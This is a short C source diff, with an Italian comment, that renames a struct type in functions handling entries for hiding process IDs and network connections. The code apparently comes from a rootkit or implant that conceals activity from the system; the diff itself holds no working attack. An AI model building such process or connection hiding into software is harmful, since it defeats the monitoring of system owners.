@@ -121,7 +121,7 @@ DWORD AM_HideElemSize(DWORD type)
 	if (type == HIDE_PID)
 		return sizeof(PID_HIDE);
 	else if (type == HIDE_CNN)
-		return sizeof(connection_hide_struct);
+		return sizeof(CONNECTION_HIDE);
 	else
 		return 0;
 }
@@ -140,7 +140,7 @@ DWORD AM_HideWrapperTag(DWORD type)
 // Ritorna una struttura nulla del tipo relativo
 BYTE *AM_HideNullEntry(DWORD type)
 {
-	static connection_hide_struct connection_hide = NULL_CONNETCION_HIDE_STRUCT;
+	static CONNECTION_HIDE connection_hide = NULL_CONNETCION_HIDE_STRUCT;
 	static PID_HIDE pid_hide = NULL_PID_HIDE_STRUCT;
 
 	if (type == HIDE_PID)
